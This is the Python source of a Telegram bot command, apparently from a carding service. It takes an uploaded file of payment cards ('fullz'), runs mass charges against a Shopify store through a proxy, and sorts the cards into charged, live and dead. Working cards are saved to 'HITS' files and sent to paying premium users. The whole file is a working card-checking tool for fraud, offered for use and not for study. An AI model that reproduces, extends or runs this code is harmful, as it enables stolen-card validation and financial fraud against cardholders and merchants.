from pyrogram import Client, filters
from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton
import asyncio, time, os, httpx, traceback
from datetime import date
from plugins.func.users_sql import fetchinfo, updatedata, insert_reg_data, setantispamtime, get_user_gate
from plugins.gates.func.sl_charge_func import sl_charge_func, get_charge_resp
from plugins.gates.TOOLS.getcc_for_txt import getcc_for_txt

stop_flag = False

async def save_cc(result, file_name):
    try:
        cc = result["fullz"]
        resp = result["response"]
        emoji = "✅" if result.get("hits") == "CHARGED" else "⚠️" if result.get("hits") == "LIVE" else "❌"
        all_file = os.path.join("HITS", file_name)
        with open(all_file, "a", encoding="utf-8") as f:
            f.write(f"{emoji} {cc} -> {resp}\n")
        if result.get("hits") == "CHARGED":
            charged_file = os.path.join("HITS", f"CHARGED_{file_name}")
            with open(charged_file, "a", encoding="utf-8") as f:
                f.write(f"{emoji} {cc} -> {resp}\n")
    except Exception as e:
        print("Save error:", str(e))

async def gcgenfunc(length=6):
    import random, string
    return "".join(random.choice(string.ascii_uppercase + string.digits) for _ in range(length))

def elapsed_time(start):
    elapsed = time.perf_counter() - start
    return int(elapsed // 3600), int((elapsed % 3600) // 60), int(elapsed % 60)

async def get_checking_response(client, message, total, key, chk_done, charged, live, start):
    hour, minute, second = elapsed_time(start)
    text = (
        f"<b>Gateway:</b> Shopify Charge ♻️\n\n"
        f"<b>Checked:</b> {chk_done}/{total}\n"
        f"<b>Charged:</b> {charged}\n"
        f"<b>Live:</b> {live}\n"
        f"<b>Dead:</b> {chk_done - charged - live}\n"
        f"<b>Time:</b> {hour}h {minute}m {second}s\n"
        f"<b>Key:</b> <code>{key}</code>"
    )
    btn = InlineKeyboardMarkup([[InlineKeyboardButton("⛔ Stop", callback_data="stop_checking")]])
    await client.edit_message_text(chat_id=message.chat.id, message_id=message.id, text=text, reply_markup=btn)

async def get_done_response(client, message, total, key, hitsfile, chk_done, charged, live, start):
    hour, minute, second = elapsed_time(start)
    text = (
        f"<b>Gateway:</b> Shopify Charge ♻️\n\n"
        f"<b>Total:</b> {total}\n"
        f"<b>Checked:</b> {chk_done}\n"
        f"<b>Charged:</b> {charged}\n"
        f"<b>Live:</b> {live}\n"
        f"<b>Dead:</b> {chk_done - charged - live}\n"
        f"<b>Time:</b> {hour}h {minute}m {second}s\n"
        f"<b>Key:</b> <code>{key}</code>"
    )
    await message.reply_document(document=hitsfile, caption=text, quote=True)

@Client.on_message(filters.command("sltxt", ["/", "."]))
async def shopify_mass_txt_cmd(client, message):
    global stop_flag
    stop_flag = False
    try:
        if not message.reply_to_message or not message.reply_to_message.document:
            return await message.reply_text("❌ Usage: Reply to a .txt file with /sltxt", quote=True)

        user_id = str(message.from_user.id)
        username = message.from_user.username or "None"
        reg = fetchinfo(user_id)
        if not reg:
            insert_reg_data(user_id, username, 200, str(date.today()))
            reg = fetchinfo(user_id)

        role = reg[2] or "FREE"
        credits = int(reg[5] or 0)

        if role != "PREMIUM":
            return await message.reply_text("❌ This command is for PREMIUM users only.", quote=True)

        gate = get_user_gate(user_id)
        if not gate:
            return await message.reply_text("❌ You have not added a gate. Use /addgate <site> <proxy>", quote=True)
        site_url, proxy = gate

        if not proxy or proxy.count(":") != 3:
            return await message.reply_text("❌ Proxy format invalid. Use: host:port:user:pass", quote=True)

        host, port, user, passwd = proxy.split(":")
        formatted_proxy = f"http://{user}:{passwd}@{host}:{port}"

        randkey = await gcgenfunc()
        key = f"sltxt{user_id}_{randkey}"
        file_name = f"{key}.txt"
        download_path = os.path.join("downloads", file_name)
        os.makedirs("downloads", exist_ok=True)
        os.makedirs("HITS", exist_ok=True)

        await message.reply_to_message.download(file_name=download_path)

        valid, cc_list = await getcc_for_txt(download_path, role)
        if not valid:
            return await message.reply_text(cc_list, quote=True)

        total_cards = len(cc_list)
        if total_cards > 30000:
            return await message.reply_text(f"❌ Max 30,000 cards allowed. You sent {total_cards}.", quote=True)

        if credits < total_cards:
            return await message.reply_text(f"❌ Not enough credits. You need {total_cards - credits} more.", quote=True)

        status_message = await message.reply_text("Started Checking...", quote=True)
        hitsfile = os.path.join("HITS", file_name)
        chk_done = charged = live = 0
        start_time = time.perf_counter()

        transport = httpx.AsyncHTTPTransport(proxy=formatted_proxy)
        async with httpx.AsyncClient(timeout=httpx.Timeout(60), transport=transport) as session:
            BATCH_SIZE = 10
            for i in range(0, total_cards, BATCH_SIZE):
                if stop_flag:
                    break
                batch = cc_list[i:i + BATCH_SIZE]
                tasks = [
                    sl_charge_func(card["fullz"], site_url, proxy=proxy, session=session, user_id=user_id)
                    for card in batch
                ]
                results = await asyncio.gather(*tasks, return_exceptions=True)

                for card, res in zip(batch, results):
                    chk_done += 1
                    if isinstance(res, Exception):
                        outcome = {"hits": "DEAD", "fullz": card["fullz"], "response": str(res)}
                    else:
                        outcome = await get_charge_resp(res, user_id, card["fullz"])

                    if outcome.get("hits") == "CHARGED":
                        charged += 1
                    elif outcome.get("hits") == "LIVE":
                        live += 1

                    if outcome.get("hits") in ["CHARGED", "LIVE"]:
                        emoji = "✅" if outcome["hits"] == "CHARGED" else "⚠️"
                        try:
                            await client.send_message(
                                chat_id=message.from_user.id,
                                text=f"{emoji} <b>{outcome['hits']}</b>\n<code>{outcome['fullz']}</code>\n<b>Response:</b> {outcome['response']}",
                            )
                        except Exception as e:
                            print("DM send failed:", e)

                    await save_cc(outcome, file_name)

                await get_checking_response(client, status_message, total_cards, key, chk_done, charged, live, start_time)

        if not stop_flag:
            await get_done_response(client, message, total_cards, key, hitsfile, chk_done, charged, live, start_time)
            updatedata(user_id, "credits", credits - total_cards)
            setantispamtime(user_id)
        else:
            await message.reply_text("⛔ Process stopped by user.", quote=True)

    except Exception:
        await message.reply_text(f"❌ Error:\n<code>{traceback.format_exc()}</code>", quote=True)
